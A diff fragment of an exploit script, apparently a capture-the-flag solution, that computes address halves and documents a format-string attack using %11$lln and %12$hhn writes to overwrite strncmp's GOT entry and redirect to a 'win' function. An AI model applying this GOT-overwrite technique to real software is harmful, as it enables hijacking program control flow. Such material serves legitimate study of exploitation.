@@ -57,8 +57,8 @@ top_half = win_addr & 0x00FFFF
 bottom_half = 0x1240 - top_half
 print(f"Top half is:{top_half}")
 print(f"Bottom half is:{bottom_half}")
-
-# offset = 8
+# offset = 8 (before!)
+# offset = 11
 # Only lln works
 # 1) %11$lln writes total printed count (0x11F6) into 0x4034f8 (low 2 bytes of strncmp@GOT)
 # 2) %12$hhn writes the low 1 byte of the new count (0x40 from 0x1240) into 0x4034fa (3rd byte)
